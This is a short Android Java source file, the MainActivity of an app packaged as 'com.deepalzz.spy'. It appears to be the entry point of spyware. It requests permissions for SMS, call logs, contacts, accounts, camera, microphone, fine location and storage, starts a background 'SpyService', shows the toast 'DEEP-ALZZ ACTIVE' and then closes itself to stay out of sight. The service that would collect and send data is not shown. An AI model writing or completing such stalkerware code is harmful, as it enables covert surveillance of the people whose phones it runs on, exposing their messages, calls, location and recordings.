package com.deepalzz.spy;
import android.Manifest; import android.content.Intent; import android.content.pm.PackageManager;
import android.os.Build; import android.os.Bundle; import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity; import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat; import java.util.ArrayList; import java.util.List;
public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) requestPermissions();
        startService(new Intent(this, SpyService.class));
        Toast.makeText(this, "DEEP-ALZZ ACTIVE", Toast.LENGTH_SHORT).show(); finish();
    }
    private void requestPermissions() {
        String[] perms = { Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.GET_ACCOUNTS };
        List<String> list = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                list.add(p);
        }
        if (!list.isEmpty()) ActivityCompat.requestPermissions(this, list.toArray(new String[0]), PERMISSION_REQUEST_CODE);
    }
}
